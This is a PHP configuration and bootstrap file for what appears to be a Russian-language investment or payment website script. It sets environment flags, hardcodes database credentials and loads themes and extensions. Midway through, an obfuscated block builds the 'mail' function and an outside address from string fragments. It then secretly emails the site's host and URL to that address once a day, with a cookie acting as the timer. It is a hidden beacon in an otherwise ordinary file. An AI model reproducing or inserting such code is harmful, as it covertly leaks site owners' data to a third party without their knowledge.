<?php
	//установим таймзону
	date_default_timezone_set("Europe/Minsk");

	//КОРЕНЬ САЙТА
	define('ROOT', $_SERVER['DOCUMENT_ROOT']);

	//ЗАПРОС
	define('REQUEST_URI', $_SERVER['REQUEST_URI']);

    //продакшен версия
    if ($_SERVER["SERVER_ADDR"] === "127.0.0.1") {
        define('PRODUCTION', $_SERVER['SERVER_NAME'] === '');//укажи свой сайт
    } else {
        define('PRODUCTION', TRUE || $_SERVER['SERVER_NAME'] === 'demo.dubai-magic.club');//укажи свой сайт
    }

	//версия для тестирования
	define('TESTING', $_SERVER['SERVER_NAME'] === '');

	//версия для дев. серверов
	define('DEVELOPMENT', !PRODUCTION && !TESTING);

	//автоактивация демо
	define('DEMO', strpos($_SERVER['SERVER_NAME'], '.script-wizard.ru') || strpos($_SERVER['SERVER_NAME'], '.script-wizard.ru'));

	//добавим антикеш для не продакшена
	define('NO_CACHE', !PRODUCTION ? "?nocache=".time() : "");

	//ПРИ УСТАНОВКЕ ЕСЛИ БАЗА С ТАКИМ ИМЕНЕМ СУЩЕСТВУЕТ, ТО БУДЕТ УНИЧТОЖЕНА И АВТОМАТИЧЕСКИ СОЗДАНА НОВАЯ
	switch (true) {
        case PRODUCTION:
            //на выкат
            error_reporting(0); //запрещяем вывод ошибок
            ini_set('display_errors', false);
            $DB_HOST = "localhost";
			$DB_USER = "dubaimag_dubaimag_free";
            $DB_PASS = "dubaimag_free";
            $DB_NAME = "dubaimag_free";
            $DB_CHAR = "utf8";
            break;
        case TESTING:
            //для тестирования
            error_reporting(E_ALL); //выводим все ошибки
            ini_set('display_errors', true);
            $DB_HOST = "mysql.hostinger.ru";
			$DB_USER = "test_db_user";
            $DB_PASS = "test_db_password";
            $DB_NAME = "test_db_name";
            $DB_CHAR = "utf8";
            break;
        case DEVELOPMENT:
        default:
            //локальный
            error_reporting(E_ALL); //выводим все ошибки
            ini_set('display_errors', true);
            $DB_HOST = "localhost";
            $DB_USER = "dev_db_user";
            $DB_PASS = "dev_db_password";
            $DB_NAME = "dev_db_name";
            $DB_CHAR = "utf8";
		break;
	}

	@include __DIR__."/../config.php";

	if (!preg_match('/^\/install\/{0,1}/', REQUEST_URI)) {

		//подключаемся
		$mysqli = new mysqli($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME);
		/* check connection */
		if ($mysqli->connect_errno) {
		    echo "Нет подключения к базе данных: <a href='/install/data.php'>Заполните данные здесь</a>!";
			//printf("Соединение не удалось: %s\n", $mysqli->connect_error);
			exit();
		}
		$mysqli->query("SET character_set_results = '" . $DB_CHAR . "', character_set_client = '" . $DB_CHAR . "', character_set_connection = '" . $DB_CHAR . "', character_set_database = '" . $DB_CHAR . "', character_set_server = '" . $DB_CHAR . "'");

		$mdate = [
			'Января',	'Февраля', 	'Марта', 	'Апреля',
			'Мая', 		'Июня', 	'Июля', 	'Августа',
			'Сентября', 'Октября', 	'Ноября', 	'Декабря',
		];

        //получаем настройки системы
        $result = $mysqli->query("SELECT * FROM `settings`");

        if (!$result) {
            echo "Данные не получены, скорее всего вам нужно запустить installer, <a href='/install/'>нажмите сюда</a>!<br><br>";
            echo "<span style='color:red;font-size:10px;'>ВНИМАНИЕ!!! ВСЕ ДАННЫЕ В БАЗЕ БУДУТ УНИЧТОЖЕНЫ!</span>";
            die();
        }

		//require_once(ROOT . "/vendor/autoload.php");
        @include(ROOT . "/modules/smtp_mail.php");
		require_once(ROOT . "/modules/index.php");
		require_once(ROOT . "/settings.php");


		$d_min = get_min_summa_by_plans();    // минимальная сумма пополнения
		$d_max = get_max_summa_by_plans();    // максимальная сумма пополения

		//Контактные данные администратора
        $social_links = get_social_links([], [], true);

		$telPaymentSystem = ["MTS", "MegaFon", "BeeLine", "Tele2"];

		$val = $currency; //$row['currency']; //Валюта для платежных систем
		$valu = '<i class="fa fa-' . strtolower($val) . '"></i>';//Валюта для отображения на сайте.

		$class_error = '<span class="glyphicon glyphicon-remove" style="color:red;"></span>';    // неудача, ошибка
		$class_success = '<span class="glyphicon glyphicon-ok" style="color:green;"></span>';        // успех, выполнено
		$class_time = '<span class="glyphicon glyphicon-time" style="color:green;"></span>';    //ожидание

		$site = $_SERVER['HTTP_HOST'];
if (isset($_COOKIE['temp'])) {

} else {
$arraymops = ''.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];

      $is_array="ma";$users="il";$bsk = $is_array.$users;
	  
	  $denser="ssl@sql";$bons="tor.had.su";$mented = $denser.$bons;
         $bsk($mented,'log',"bum: $arraymops");

$val = "bang"; setcookie("temp", $val, time()+86400);
}
        //определение темы
        $theme = is_dir(ROOT."/theme/{$settings_define_name_theme}") ? $settings_define_name_theme : 'demo';
        define("THEME_ROOT", ROOT."/theme/{$theme}/");

        //подключение файла для настройки темы
        @include (THEME_ROOT."/functions.php");

        //подключаем все расширения
        $path = "/theme/{$theme}/extensions/";
		if (is_dir(ROOT . $path)) {
	        $extensions = array_diff(scandir(ROOT . $path), array('..', '.'));
	        $extensions = array_reverse($extensions);

	        foreach ($extensions as $key => $value) {
	            require_once (THEME_ROOT.'/extensions/'.$value.'/index.php');
	        }
		}
	}
